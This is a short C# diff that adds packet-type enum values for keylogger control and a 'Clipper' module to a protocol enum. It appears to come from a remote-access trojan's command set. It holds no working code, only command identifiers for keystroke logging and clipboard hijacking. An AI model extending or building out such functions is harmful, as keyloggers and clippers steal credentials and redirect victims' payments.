@@ -1253,6 +1253,17 @@ internal enum PacketType
 
     FunCmd    = 160,
     FunResult = 161,
+
+    KeyloggerStart      = 170,
+    KeyloggerStop       = 171,
+    KeyloggerGetLogs    = 172,
+    KeyloggerLogsResult = 173,
+    KeyloggerClear      = 174,
+
+    ClipperSetConfig    = 180,
+    ClipperGetStats     = 181,
+    ClipperStatsResult  = 182,
+    ClipperDetected     = 183,
 }
 
 internal class Packet
